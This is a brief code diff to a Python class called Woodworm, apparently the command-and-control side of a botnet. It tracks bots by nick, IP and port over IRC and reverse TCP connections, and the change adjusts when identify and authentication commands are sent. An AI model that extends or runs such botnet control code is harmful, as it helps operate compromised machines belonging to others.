@@ -84,8 +84,8 @@ class Woodworm:
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
             self.syslog.log(f"Number of bots: {len(self.botnetDB.get_bots())}", level=logger.LogLevel.INFO)
 
-            await asyncio.sleep(1)
             bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
+            
 
 
     async def irc_onSomeoneLeftChannel(self, *args, **kwargs):
@@ -212,6 +212,7 @@ class Woodworm:
         bot = self.botnetDB.get_bot(nick)
         if bot is None:
             self.syslog.log(f"Bot not found: nick: {nick}", level=logger.LogLevel.ERROR)
+            connection.send_command("AUTH-REQ")
             return
         
         bot.set_reversed_tcp_connection(connection)
